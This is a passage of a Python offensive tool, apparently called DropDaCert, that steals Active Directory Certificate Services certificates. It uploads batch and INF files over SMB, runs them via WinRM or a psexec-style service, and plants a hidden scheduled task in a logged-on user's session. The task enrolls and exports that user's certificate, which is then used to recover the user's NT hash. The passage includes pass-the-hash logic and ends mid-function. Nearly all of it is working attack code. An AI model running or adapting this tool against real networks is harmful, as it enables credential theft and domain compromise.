#!/usr/bin/env python3
"""
DropDaCert - ADCS cert theft via scheduled task session hijack

Drops a scheduled task that runs in a target user's active session context
to request an ADCS certificate, export it as PFX, then runs certipy to
extract the user's NT hash.

Usage:
  DropDaCert.py admin:Pass@TARGET -ca HOST\\CA -dc DC_IP
  DropDaCert.py admin@TARGET -H :NTHASH -ca HOST\\CA -dc DC_IP
  DropDaCert.py domain/admin:Pass@TARGET -ca HOST\\CA -dc DC_IP -k
"""

import argparse
import base64
import io
import ipaddress
import json
import os
import re
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import time
import uuid
import warnings
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta, timezone
from os import urandom

warnings.filterwarnings("ignore", category=DeprecationWarning)
warnings.filterwarnings("ignore", message=".*ARC4.*")

import requests
from urllib3 import disable_warnings as _dw
from urllib3.exceptions import InsecureRequestWarning as _IW
_dw(category=_IW)

import winrm
from impacket.krb5 import constants
from impacket.krb5.asn1 import (
    AP_REQ, AP_REP, Authenticator, EncAPRepPart, TGS_REP, seq_set,
)
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.gssapi import (
    KRB5_AP_REQ, CheckSumField,
    GSS_C_CONF_FLAG, GSS_C_INTEG_FLAG, GSS_C_SEQUENCE_FLAG, GSS_C_MUTUAL_FLAG,
    KG_USAGE_INITIATOR_SEAL, KG_USAGE_ACCEPTOR_SEAL,
)
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import KerberosTime, Principal, Ticket
from impacket.smbconnection import SMBConnection
from pyasn1.codec.der import encoder, decoder
from pyasn1.type.univ import noValue, ObjectIdentifier

try:
    import dns.resolver as _dns
    HAS_DNS = True
except ImportError:
    HAS_DNS = False

try:
    from ldap3 import Server, Connection, NTLM, ALL
    HAS_LDAP = True
except ImportError:
    HAS_LDAP = False


# ── Templates ────────────────────────────────────────────────────────────────

CERT_INF = """\
[Version]
Signature="$Windows NT$"

[NewRequest]
Subject = "CN={cn}"
KeySpec = 1
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
SMIME = FALSE
PrivateKeyArchive = FALSE
UserProtected = FALSE
UseExistingKeySet = FALSE
ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
ProviderType = 12
RequestType = PKCS10
KeyUsage = 0xa0

[EnhancedKeyUsageExtension]
OID=1.3.6.1.5.5.7.3.2

[RequestAttributes]
CertificateTemplate = {template}
"""

CERT_BAT = """\
@echo off
setlocal enabledelayedexpansion
set "BASE={drop_dir}\\{prefix}"

certreq -new "%BASE%.inf" "%BASE%.req" >"%BASE%.log" 2>&1
if !ERRORLEVEL! neq 0 (echo FAIL_CERTREQ_NEW>"%BASE%.status" & exit /b 1)

certreq -submit{ca_flag} "%BASE%.req" "%BASE%.cer" >>"%BASE%.log" 2>&1
if not exist "%BASE%.cer" (
    if exist "%BASE%.rsp" (
        certreq -accept "%BASE%.rsp" >>"%BASE%.log" 2>&1
        if !ERRORLEVEL! neq 0 (echo FAIL_ACCEPT>"%BASE%.status" & exit /b 1)
        goto :findhash
    )
    echo FAIL_CERTREQ_SUBMIT>"%BASE%.status" & exit /b 1
)

certutil -user -addstore my "%BASE%.cer" >>"%BASE%.log" 2>&1
if !ERRORLEVEL! neq 0 (echo FAIL_ADDSTORE>"%BASE%.status" & exit /b 1)

:findhash
set "HASH="
for /f "tokens=2 delims=:" %%A in ('certutil -user -store my ^| findstr /r /c:"Hach\\. cert\\." /c:"Cert Hash"') do (
    set "tmp=%%A"
    set "tmp=!tmp: =!"
    set "HASH=!tmp!"
)

if "!HASH!"=="" (echo FAIL_NOHASH>"%BASE%.status" & exit /b 1)

certutil -user -repairstore my !HASH! >nul 2>&1
certutil -user -exportPFX -p "" -f my !HASH! "%BASE%.pfx" NoChain,NoRoot >>"%BASE%.log" 2>&1
certutil -user -delstore my !HASH! >nul 2>&1

if exist "%BASE%.pfx" (
    echo OK>"%BASE%.status"
    exit /b 0
) else (
    echo FAIL_EXPORT>"%BASE%.status"
    exit /b 2
)
"""

CERT_BAT_PHASE1 = """\
@echo off
setlocal enabledelayedexpansion
set "BASE={drop_dir}\\{prefix}"
certreq -new "%BASE%.inf" "%BASE%.req" >"%BASE%.log" 2>&1
if !ERRORLEVEL! neq 0 (echo FAIL_CERTREQ_NEW>"%BASE%.status" & exit /b 1)
echo OK_REQ>"%BASE%.status"
"""

CERT_BAT_PHASE2 = """\
@echo off
setlocal enabledelayedexpansion
set "BASE={drop_dir}\\{prefix}"
certutil -user -addstore my "%BASE%.cer" >"%BASE%.log" 2>&1
if !ERRORLEVEL! neq 0 (echo FAIL_ADDSTORE>"%BASE%.status" & exit /b 1)
set "HASH="
for /f "tokens=2 delims=:" %%A in ('certutil -user -store my ^| findstr /r /c:"Hach\\. cert\\." /c:"Cert Hash"') do (
    set "tmp=%%A"
    set "tmp=!tmp: =!"
    set "HASH=!tmp!"
)
if "!HASH!"=="" (echo FAIL_NOHASH>"%BASE%.status" & exit /b 1)
certutil -user -repairstore my !HASH! >nul 2>&1
certutil -user -exportPFX -p "" -f my !HASH! "%BASE%.pfx" NoChain,NoRoot >>"%BASE%.log" 2>&1
certutil -user -delstore my !HASH! >nul 2>&1
if exist "%BASE%.pfx" (echo OK>"%BASE%.status" & exit /b 0) else (echo FAIL_EXPORT>"%BASE%.status" & exit /b 2)
"""

TASK_XML = """\
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
<Triggers>
   <RegistrationTrigger>
   <EndBoundary>{end_boundary}</EndBoundary>
   </RegistrationTrigger>
</Triggers>
<Principals>
   <Principal id="LocalSystem">
   <UserId>{domain}\\{username}</UserId>
   <RunLevel>HighestAvailable</RunLevel>
   </Principal>
</Principals>
<Settings>
   <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
   <AllowHardTerminate>true</AllowHardTerminate>
   <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
   <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
   <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
   <IdleSettings>
      <RestartOnIdle>false</RestartOnIdle>
      <StopOnIdleEnd>true</StopOnIdleEnd>
   </IdleSettings>
   <Hidden>true</Hidden>
   <WakeToRun>false</WakeToRun>
   <Priority>7</Priority>
   <RunOnlyIfIdle>false</RunOnlyIfIdle>
   <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
   <AllowStartOnDemand>true</AllowStartOnDemand>
   <Enabled>true</Enabled>
</Settings>
<Actions Context="LocalSystem">
   <Exec>
   <Command>{exec_cmd}</Command>
   <Arguments>{exec_args}</Arguments>
   </Exec>
</Actions>
</Task>
"""

EXEC_METHODS = {
    "cmd": {
        "cmd":  "cmd.exe",
        "args": "/c {drop_dir}\\{prefix}.bat",
    },
    "conhost": {
        "cmd":  "conhost",
        "args": "--headless {drop_dir}\\{prefix}.bat",
    },
    "powershell": {
        "cmd":  "powershell.exe",
        "args": "-NonInteractive -WindowStyle Hidden -File {drop_dir}\\{prefix}.bat",
    },
    "wscript": {
        "cmd":  "wscript.exe",
        "args": "//B //NoLogo {drop_dir}\\{prefix}.vbs",
    },
}

VBS_STUB = """\
Set oShell = CreateObject("WScript.Shell")
oShell.Run "cmd.exe /c {drop_dir}\\{prefix}.bat", 0, True
"""

STATUS_MESSAGES = {
    "OK": "Certificate enrolled and exported successfully",
    "FAIL_CERTREQ_NEW": "certreq -new failed (bad INF or crypto provider issue)",
    "FAIL_CERTREQ_SUBMIT": "certreq -submit failed (CA unreachable, template denied, or enrollment rejected)",
    "FAIL_ADDSTORE": "certutil -addstore failed (cert import to user store failed)",
    "FAIL_NOHASH": "No cert hash found (enrollment may have been silently denied)",
    "FAIL_EXPORT": "PFX export failed (key not exportable or store corruption)",
    "FAIL_ACCEPT": "certreq -accept failed (could not install CA response)",
}


# ── Output helpers ───────────────────────────────────────────────────────────

def info(msg):  print(f"  [+] {msg}", flush=True)
def warn(msg):  print(f"  [!] {msg}", file=sys.stderr, flush=True)
def die(msg):   print(f"  [-] {msg}", file=sys.stderr, flush=True); sys.exit(1)


# ── DNS / hostname resolution ───────────────────────────────────────────────

def _is_ip(s):
    try:
        ipaddress.ip_address(s)
        return True
    except ValueError:
        return False


def resolve_target(target, dc_ip, domain):
    if _is_ip(target):
        ip = target
        hostname = None
        if HAS_DNS and dc_ip:
            try:
                r = _dns.Resolver()
                r.nameservers = [dc_ip]
                arpa = ".".join(reversed(ip.split("."))) + ".in-addr.arpa"
                hostname = str(r.resolve(arpa, "PTR")[0]).rstrip(".")
            except Exception:
                pass
        if not hostname:
            try:
                hostname = socket.gethostbyaddr(ip)[0]
            except Exception:
                pass
        if not hostname:
            try:
                smb = SMBConnection(ip, ip, timeout=5)
                smb.login("", "")
            except Exception:
                pass
            try:
                hostname = smb.getServerName()
                if domain and "." not in hostname:
                    hostname = f"{hostname}.{domain}"
            except Exception:
                pass
        if not hostname:
            warn(f"Cannot resolve hostname for {ip} — using IP directly (Kerberos may fail)")
            hostname = ip
        return hostname, ip
    else:
        hostname = target if "." in target else f"{target}.{domain}"
        ip = None
        if HAS_DNS and dc_ip:
            try:
                r = _dns.Resolver()
                r.nameservers = [dc_ip]
                ip = str(r.resolve(hostname, "A")[0])
            except Exception:
                pass
        if not ip:
            try:
                ip = socket.gethostbyname(hostname)
            except Exception:
                pass
        if not ip:
            die(f"Cannot resolve {hostname}. Check -dc or DNS.")
        return hostname, ip


# ── GSSAPI token helpers ────────────────────────────────────────────────────

def _gss_encode(data):
    oid_bytes = encoder.encode(ObjectIdentifier((1, 2, 840, 113554, 1, 2, 2)))
    payload = oid_bytes + data
    n = len(payload)
    if n < 128:
        size = bytes([n])
    elif n < 256:
        size = bytes([0x81, n])
    else:
        size = bytes([0x82, n >> 8, n & 0xff])
    return b'\x60' + size + payload


def _gss_decode(data):
    if data[1] < 128:
        skip = 2
    else:
        skip = 2 + (data[1] - 128)
    _, rest = decoder.decode(data[skip:], asn1Spec=ObjectIdentifier())
    return bytes(rest)


# ── Pure-impacket Kerberos WinRM ─────────────────────────────────────────────

class _ExecResult:
    __slots__ = ("std_out", "std_err", "status_code")
    def __init__(self, out, err, rc):
        self.std_out = out
        self.std_err = err
        self.status_code = rc


class KerbWinRM:
    _ANON     = 'http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous'
    _CMD_URI  = 'http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd'
    _RSP_NS   = 'http://schemas.microsoft.com/wbem/wsman/1/windows/shell'
    _BOUNDARY = b'--Encrypted Boundary'
    _PROTO    = 'application/HTTP-Kerberos-session-encrypted'

    def __init__(self, hostname, ip, username, password, nt_hash, domain,
                 dc_ip, aes_key="", port=5985):
        self.hostname = hostname
        self.ip       = ip
        self.username = username
        self.password = password
        self.nt_hash  = nt_hash
        self.domain   = domain
        self.dc_ip    = dc_ip
        self.aes_key  = aes_key
        self.port     = port
        self._sess    = None
        self._subkey  = None
        self._cipher  = None
        self._tgs_key = None
        self._tgs_cipher = None
        self._seq_cli = 0
        self._seq_srv = 0
        self._shell_id = None

    def connect(self):
        self._sess = requests.Session()
        self._sess.verify = False
        tok = self._build_ap_req()
        self._do_ap_rep(tok)
        self._shell_id = self._create_shell()

    def run_cmd(self, cmd):
        cid = self._execute(self._shell_id, cmd)
        out, err, rc = self._receive_all(self._shell_id, cid)
        return _ExecResult(out, err, rc)

    def run_ps(self, ps_code):
        enc = base64.b64encode(ps_code.encode('utf-16-le')).decode()
        return self.run_cmd(f'powershell -NonInteractive -EncodedCommand {enc}')

    def close(self):
        if self._shell_id:
            try:
                self._delete_shell(self._shell_id)
            except Exception:
                pass
            self._shell_id = None
        if self._sess:
            self._sess.close()
            self._sess = None

    def _build_ap_req(self):
        lm_hash = b''
        nt_hash = b''
        aes_key = b''
        if self.nt_hash:
            parts = self.nt_hash.split(':')
            if len(parts) == 2 and parts[0]:
                lm_hash = bytes.fromhex(parts[0])
            nt_hash = bytes.fromhex(parts[-1])
        if self.aes_key:
            aes_key = bytes.fromhex(self.aes_key)

        user = Principal(self.username,
                         type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        tgt, tgt_cipher, _, tgt_key = getKerberosTGT(
            user, self.password or '', self.domain,
            lm_hash, nt_hash, aes_key, self.dc_ip)

        spn = Principal(f'http/{self.hostname}',
                        type=constants.PrincipalNameType.NT_SRV_INST.value)
        tgs_raw, tgs_cipher, _, tgs_key = getKerberosTGS(
            spn, self.domain, self.dc_ip, tgt, tgt_cipher, tgt_key)

        self._tgs_key = tgs_key
        self._tgs_cipher = tgs_cipher

        tgs_rep = decoder.decode(tgs_raw, asn1Spec=TGS_REP())[0]
        ticket = Ticket()
        ticket.from_asn1(tgs_rep['ticket'])

        chk = CheckSumField()
        chk['Lgth'] = 16
        chk['Flags'] = (GSS_C_CONF_FLAG | GSS_C_INTEG_FLAG |
                        GSS_C_SEQUENCE_FLAG | GSS_C_MUTUAL_FLAG)

        now = datetime.now(timezone.utc)
        auth = Authenticator()
        auth['authenticator-vno'] = 5
        auth['crealm'] = self.domain.upper()
        seq_set(auth, 'cname', user.components_to_asn1)
        auth['cusec'] = now.microsecond
        auth['ctime'] = KerberosTime.to_asn1(now)
        auth['cksum'] = noValue
        auth['cksum']['cksumtype'] = 0x8003
        auth['cksum']['checksum'] = chk.getData()
        auth['seq-number'] = 0
        auth['subkey'] = noValue
        auth['subkey']['keyvalue'] = urandom(32)
        auth['subkey']['keytype'] = 18

        enc_auth = tgs_cipher.encrypt(tgs_key, 11, encoder.encode(auth), None)

        ap_req = AP_REQ()
        ap_req['pvno'] = 5
        ap_req['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
        ap_req['ap-options'] = constants.encodeFlags(
            [constants.APOptions.mutual_required.value])
        seq_set(ap_req, 'ticket', ticket.to_asn1)
        ap_req['authenticator'] = noValue
        ap_req['authenticator']['etype'] = tgs_cipher.enctype
        ap_req['authenticator']['cipher'] = enc_auth

        return _gss_encode(KRB5_AP_REQ + encoder.encode(ap_req))

    def _do_ap_rep(self, gssapi_token):
        resp = self._sess.post(
            f'http://{self.ip}:{self.port}/wsman',
            headers={'Authorization': 'Kerberos ' + base64.b64encode(gssapi_token).decode()},
        )
        www_auth = resp.headers.get('WWW-Authenticate', '')
        if not www_auth.startswith('Kerberos '):
            raise RuntimeError(
                f'Kerberos auth failed (HTTP {resp.status_code}): '
                f'WWW-Authenticate={www_auth!r}')

        ap_rep_gssapi = base64.b64decode(www_auth[9:])
        ap_rep_bytes = _gss_decode(ap_rep_gssapi)
        ap_rep = decoder.decode(ap_rep_bytes[2:], asn1Spec=AP_REP())[0]

        rep_plain = self._tgs_cipher.decrypt(
            self._tgs_key, 12, bytes(ap_rep['enc-part']['cipher']))
        rep_dec = decoder.decode(rep_plain, asn1Spec=EncAPRepPart())[0]

        keydata = bytes(rep_dec['subkey']['keyvalue'])
        keytype = int(rep_dec['subkey']['keytype'])
        self._subkey = Key(keytype, keydata)
        self._cipher = _enctype_table[keytype]
        self._seq_cli = 0
        self._seq_srv = int(rep_dec['seq-number'])

    def _wrap(self, plaintext):
        inner = struct.pack('>BBBBHHQ', 5, 4, 6, 0xff, 0, 0, self._seq_cli)
        enc = self._cipher.encrypt(self._subkey, KG_USAGE_INITIATOR_SEAL,
                                   plaintext + inner, None)
        rot = len(enc) - (28 % len(enc))
        enc = enc[rot:] + enc[:rot]
        sig = struct.pack('>BBBBHHQ', 5, 4, 6, 0xff, 0, 28, self._seq_cli)
        self._seq_cli += 1
        return sig + enc[:44], enc[44:]

    def _unwrap(self, sig, enc):
        _, _, _, _, ec, rrc, _ = struct.unpack('>BBBBHHQ', sig[:16])
        blob = sig[16:] + enc
        rot = (rrc + ec) % len(blob)
        blob = blob[rot:] + blob[:rot]
        plaintext = self._cipher.decrypt(self._subkey, KG_USAGE_ACCEPTOR_SEAL, blob)
        return plaintext[:-(ec + 16)]

    def _build_multipart(self, soap_bytes):
        sig, enc = self._wrap(soap_bytes)
        payload = struct.pack('<I', len(sig)) + sig + enc
        orig_len = str(len(soap_bytes)).encode()
        proto = self._PROTO.encode()
        return (
            self._BOUNDARY + b'\r\n'
            b'Content-Type: ' + proto + b'\r\n'
            b'OriginalContent: type=application/soap+xml;charset=UTF-8;Length=' +
            orig_len + b'\r\n' +
            self._BOUNDARY + b'\r\n'
            b'Content-Type: application/octet-stream\r\n' +
            payload +
            self._BOUNDARY + b'--\r\n'
        )

    def _parse_multipart(self, body_bytes):
        for ct_marker in (
            b'\r\nContent-Type: application/octet-stream\r\n',
            b'\r\n\tContent-Type: application/octet-stream\r\n',
        ):
            if ct_marker not in body_bytes:
                continue
            start = body_bytes.index(ct_marker) + len(ct_marker)
            payload = body_bytes[start:]
            for closing in (b'\r\n' + self._BOUNDARY + b'--\r\n',
                            self._BOUNDARY + b'--\r\n'):
                if payload.endswith(closing):
                    payload = payload[:-len(closing)]
                    break
            sig_len = struct.unpack('<I', payload[:4])[0]
            sig = payload[4:4 + sig_len]
            enc = payload[4 + sig_len:]
            return self._unwrap(sig, enc)
        return body_bytes

    def _send(self, soap_xml):
        soap_bytes = soap_xml.encode('utf-8')
        body = self._build_multipart(soap_bytes)
        ct = (f'multipart/encrypted;'
              f'protocol="{self._PROTO}";'
              f'boundary="Encrypted Boundary"')
        resp = self._sess.post(
            f'http://{self.ip}:{self.port}/wsman',
            data=body, headers={'Content-Type': ct},
        )
        if resp.status_code not in (200, 500):
            raise RuntimeError(
                f'WinRM HTTP {resp.status_code}: '
                f'{resp.content[:300].decode(errors="replace")}')
        if not resp.content.strip():
            return ''
        if self._BOUNDARY in resp.content:
            result = self._parse_multipart(resp.content)
        else:
            result = resp.content
        if isinstance(result, bytes):
            result = result.decode('utf-8', errors='replace')
        return result.strip()

    @staticmethod
    def _xe(s):
        return (s.replace('&', '&amp;').replace('<', '&lt;')
                 .replace('>', '&gt;').replace('"', '&quot;'))

    def _envelope(self, action, selector=None, opts='', body=''):
        sel = (f'<w:SelectorSet>'
               f'<w:Selector Name="ShellId">{selector}</w:Selector>'
               f'</w:SelectorSet>') if selector else ''
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>'
            f'<s:Envelope'
            f' xmlns:s="http://www.w3.org/2003/05/soap-envelope"'
            f' xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"'
            f' xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"'
            f' xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">'
            f'<s:Header>'
            f'<a:To>http://{self.hostname}:{self.port}/wsman</a:To>'
            f'<a:ReplyTo><a:Address s:mustUnderstand="true">{self._ANON}</a:Address></a:ReplyTo>'
            f'<a:MessageID>uuid:{uuid.uuid4()}</a:MessageID>'
            f'<a:Action s:mustUnderstand="true">{action}</a:Action>'
            f'<w:MaxEnvelopeSize s:mustUnderstand="true">153600</w:MaxEnvelopeSize>'
            f'<w:OperationTimeout>PT60.000S</w:OperationTimeout>'
            f'<w:ResourceURI s:mustUnderstand="true">{self._CMD_URI}</w:ResourceURI>'
            f'{sel}{opts}</s:Header>'
            f'<s:Body>{body}</s:Body>'
            f'</s:Envelope>'
        )

    def _create_shell(self):
        opts = ('<w:OptionSet>'
                '<w:Option Name="WINRS_NOPROFILE">FALSE</w:Option>'
                '<w:Option Name="WINRS_CODEPAGE">437</w:Option>'
                '</w:OptionSet>')
        body = ('<rsp:Shell>'
                '<rsp:InputStreams>stdin</rsp:InputStreams>'
                '<rsp:OutputStreams>stdout stderr</rsp:OutputStreams>'
                '</rsp:Shell>')
        xml = self._envelope(
            'http://schemas.xmlsoap.org/ws/2004/09/transfer/Create',
            opts=opts, body=body)
        resp = self._send(xml)
        root = ET.fromstring(resp)
        sh = root.find('.//{%s}ShellId' % self._RSP_NS)
        if sh is not None:
            return sh.text
        m = re.search(r'<[^>]*ShellId[^>]*>([^<]+)<', resp)
        if m:
            return m.group(1)
        raise RuntimeError(f'No ShellId in Create response:\n{resp[:500]}')

    def _execute(self, shell_id, cmd):
        body = (f'<rsp:CommandLine>'
                f'<rsp:Command>{self._xe(cmd)}</rsp:Command>'
                f'</rsp:CommandLine>')
        xml = self._envelope(
            'http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command',
            selector=shell_id, body=body)
        resp = self._send(xml)
        root = ET.fromstring(resp)
        cid = root.find('.//{%s}CommandId' % self._RSP_NS)
        if cid is not None:
            return cid.text
        m = re.search(r'<[^>]*CommandId[^>]*>([^<]+)<', resp)
        if m:
            return m.group(1)
        raise RuntimeError(f'No CommandId in Execute response:\n{resp[:500]}')

    def _receive_once(self, shell_id, cmd_id):
        body = (f'<rsp:Receive>'
                f'<rsp:DesiredStream CommandId="{cmd_id}">stdout stderr</rsp:DesiredStream>'
                f'</rsp:Receive>')
        xml = self._envelope(
            'http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive',
            selector=shell_id, body=body)
        resp = self._send(xml)
        root = ET.fromstring(resp)
        stdout = b''
        stderr = b''
        for s in root.findall('.//{%s}Stream' % self._RSP_NS):
            if s.text:
                data = base64.b64decode(s.text)
                if s.get('Name') == 'stdout':
                    stdout += data
                elif s.get('Name') == 'stderr':
                    stderr += data
        rc = None
        for state in root.findall('.//{%s}CommandState' % self._RSP_NS):
            if 'Done' in state.get('State', ''):
                el = state.find('{%s}ExitCode' % self._RSP_NS)
                rc = int(el.text) if el is not None else 0
        return stdout, stderr, rc

    def _receive_all(self, shell_id, cmd_id):
        out, err = b'', b''
        while True:
            o, e, rc = self._receive_once(shell_id, cmd_id)
            out += o
            err += e
            if rc is not None:
                return out, err, rc

    def _delete_shell(self, shell_id):
        xml = self._envelope(
            'http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete',
            selector=shell_id)
        self._send(xml)


# ── Transport layer ──────────────────────────────────────────────────────────

def _run(transport, cmd):
    r = transport.run_cmd(cmd)
    if isinstance(r, tuple):
        return r
    out = r.std_out if isinstance(r.std_out, str) else r.std_out.decode(errors="replace")
    err = r.std_err if isinstance(r.std_err, str) else r.std_err.decode(errors="replace")
    return out, err, r.status_code


def _run_ps(transport, ps):
    r = transport.run_ps(ps)
    if isinstance(r, tuple):
        return r
    out = r.std_out if isinstance(r.std_out, str) else r.std_out.decode(errors="replace")
    err = r.std_err if isinstance(r.std_err, str) else r.std_err.decode(errors="replace")
    return out, err, r.status_code


def connect_winrm(hostname, ip, username, password, nt_hash, domain,
                  dc_ip, aes_key, use_krb, port=5985):
    if use_krb:
        k = KerbWinRM(hostname, ip, username, password, nt_hash, domain,
                      dc_ip, aes_key, port)
        k.connect()
        return k
    url = f"http://{ip}:{port}/wsman"
    if nt_hash and not password:
        nt = nt_hash.split(":")[-1]
        lm = "0" * 32
        ntlm_file = os.path.join(
            os.environ.get("TMPDIR", "/tmp"), f".ntlm_{uuid.uuid4().hex[:8]}")
        user_prefix = f"{domain}\\{username}" if domain else username
        with open(ntlm_file, "w") as f:
            f.write(f"{user_prefix}:1000:{lm}:{nt}:[U]:LCT-0\n")
        os.environ["NTLM_USER_FILE"] = ntlm_file
    auth_user = f"{domain}\\{username}" if domain else username
    return winrm.Session(url,
                         auth=(auth_user, password or ""),
                         transport="ntlm",
                         read_timeout_sec=60,
                         operation_timeout_sec=55)


# ── Susinternals transport ───────────────────────────────────────────────────

class SusinternalsExec:
    def __init__(self, target_ip, username, password, nt_hash, domain,
                 dc_ip, aes_key, use_krb):
        self.target_ip = target_ip
        self.username  = username
        self.password  = password
        self.nt_hash   = nt_hash
        self.domain    = domain
        self.dc_ip     = dc_ip
        self.aes_key   = aes_key
        self.use_krb   = use_krb
        self._script   = self._find_psexecsvc()

    def _find_psexecsvc(self):
        candidates = [
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "psexecsvc.py"),
            shutil.which("psexecsvc.py") or "",
        ]
        for p in candidates:
            if p and os.path.isfile(p):
                return p
        die("psexecsvc.py not found — download from github.com/sensepost/susinternals "
            "and place alongside DropDaCert.py")

    def _build_target_str(self):
        if self.domain:
            t = f"{self.domain}/{self.username}"
        else:
            t = self.username
        if self.password:
            t += f":{self.password}"
        t += f"@{self.target_ip}"
        return t

    @staticmethod
    def _filter_output(text):
        # strip control chars (backspace, etc.) injected by psexecsvc pipe handling
        text = re.sub(r'[\x00-\x09\x0b\x0c\x0e-\x1f]', '', text)
        text = text.replace('\r', '')
        lines = text.splitlines(True)
        filtered = []
        for line in lines:
            s = line.strip()
            if (s.startswith("Impacket ") or s.startswith("Copyright ") or
                s.startswith("[*]") or s.startswith("[+]") or
                s.startswith("[!]") or s.startswith("[-]") or
                s.startswith("Exception in thread") or
                s.startswith("Traceback ") or s.startswith("File ") or
                s.startswith("impacket.") or s.startswith("During handling") or
                s == ""):
                continue
            filtered.append(line)
        return "".join(filtered)

    def run_cmd(self, cmd):
        args = [sys.executable, self._script, self._build_target_str(),
                "-system", "-command", "cmd.exe", "-arguments", f"/c {cmd}"]
        if self.nt_hash:
            h = self.nt_hash
            if ":" not in h:
                h = f"aad3b435b51404eeaad3b435b51404ee:{h}"
            args.extend(["-hashes", h])
        if self.use_krb:
            args.append("-k")
        if self.dc_ip:
            args.extend(["-dc-ip", self.dc_ip])
        if self.aes_key:
            args.extend(["-aes-key", self.aes_key])
        try:
            r = subprocess.run(args, stdin=subprocess.DEVNULL,
                               capture_output=True, text=True, timeout=300)
            out = self._filter_output(r.stdout)
            rc = r.returncode
            # psexecsvc pipe disconnect after cmd /c exits is expected
            if rc != 0 and "STATUS_PIPE_DISCONNECTED" in r.stderr:
                rc = 0
            return out, r.stderr, rc
        except subprocess.TimeoutExpired:
            return "", "susinternals: command timed out", 1

    def run_ps(self, ps_code):
        enc = base64.b64encode(ps_code.encode("utf-16-le")).decode()
        return self.run_cmd(f"powershell -NonInteractive -EncodedCommand {enc}")

    def close(self):
        pass


# ── SMB file transfer ────────────────────────────────────────────────────────

def _parse_unc(drop_dir):
    parts = drop_dir.replace("\\", "/").split("/", 1)
    drive = parts[0].rstrip(":") + "$"
    rest = parts[1].replace("\\", "/") if len(parts) > 1 else ""
    return drive, rest


def smb_connect(ip, hostname, username, password, nt_hash, domain,
                dc_ip, aes_key, use_krb):
    remote_name = hostname if use_krb else ip
    smb = SMBConnection(remote_name, ip)
    if use_krb:
        smb.kerberosLogin(username, password or "", domain, "", "",
                          aes_key or "", kdcHost=dc_ip)
    elif nt_hash:
        lm, nt = "", nt_hash
        if ":" in nt_hash:
            lm, nt = nt_hash.split(":", 1)
        smb.login(username, "", domain,
                  lmhash=lm or "aad3b435b51404eeaad3b435b51404ee", nthash=nt)
    else:
        smb.login(username, password or "", domain)
    return smb


def smb_upload(smb, files, drop_dir):
    share, rel = _parse_unc(drop_dir)
    for fname, data in files.items():
        remote = f"{rel}/{fname}" if rel else fname
        smb.putFile(share, remote, io.BytesIO(data).read)


def smb_download(smb, drop_dir, filename, local_path):
    share, rel = _parse_unc(drop_dir)
    remote = f"{rel}/{filename}" if rel else filename
    buf = io.BytesIO()
    smb.getFile(share, remote, buf.write)
    with open(local_path, "wb") as fh:
        fh.write(buf.getvalue())
    return len(buf.getvalue())


def smb_read_text(smb, drop_dir, filename):
    share, rel = _parse_unc(drop_dir)
    remote = f"{rel}/{filename}" if rel else filename
    buf = io.BytesIO()
    try:
        smb.getFile(share, remote, buf.write)
        return buf.getvalue().decode(errors="replace").strip()
    except Exception:
        return None


def smb_file_exists(smb, drop_dir, filename):
    share, rel = _parse_unc(drop_dir)
    search = f"{rel}/{filename}" if rel else filename
    try:
        results = smb.listPath(share, search)
        return len(results) > 0
    except Exception:
        return False


def smb_delete_files(smb, drop_dir, prefix):
    share, rel = _parse_unc(drop_dir)
    for ext in (".inf", ".bat", ".req", ".cer", ".rsp", ".pfx", ".xml",
                ".vbs", ".log", ".status"):
        remote = f"{rel}/{prefix}{ext}" if rel else f"{prefix}{ext}"
        try:
            smb.deleteFile(share, remote)
        except Exception:
            pass


# ── smbclient.py download ───────────────────────────────────────────────────

def smbclient_download(target_ip, username, password, nt_hash, domain,
                       drop_dir, filename, local_path, use_krb=False,
                       dc_ip=None, aes_key=None):
    smbclient = shutil.which("smbclient.py") or shutil.which("impacket-smbclient")
    if not smbclient:
        die("smbclient.py / impacket-smbclient not found on PATH")

    share, rel = _parse_unc(drop_dir)
    remote_file = f"{rel}/{filename}" if rel else filename

    target_str = f"{domain}/{username}"
    if password:
        target_str += f":{password}"
    target_str += f"@{target_ip}"

    args = [smbclient, target_str]
    if nt_hash:
        h = nt_hash if ":" in nt_hash else f"aad3b435b51404eeaad3b435b51404ee:{nt_hash}"
        args.extend(["-hashes", h])
    if use_krb:
        args.append("-k")
    if dc_ip:
        args.extend(["-dc-ip", dc_ip])

    cmds = f"use {share}\nlcd {os.path.dirname(os.path.abspath(local_path))}\nget {remote_file}\nexit\n"
    try:
        r = subprocess.run(args, input=cmds, capture_output=True, text=True, timeout=60)
    except subprocess.TimeoutExpired:
        die("smbclient.py download timed out")

    if not os.path.isfile(local_path):
        expected = os.path.join(
            os.path.dirname(os.path.abspath(local_path)),
            os.path.basename(remote_file)
        )
        if os.path.isfile(expected) and expected != local_path:
            os.rename(expected, local_path)
        elif not os.path.isfile(local_path):
            die(f"smbclient.py download failed: {r.stderr.strip()}")


# ── CA discovery ─────────────────────────────────────────────────────────────

def discover_ca(domain, dc_ip, username, password, nt_hash):
    if not HAS_LDAP:
        return None
    try:
        ldap_pass = password or ""
        if not password and nt_hash:
            nt = nt_hash.split(":")[-1]
            ldap_pass = f"aad3b435b51404eeaad3b435b51404ee:{nt}"
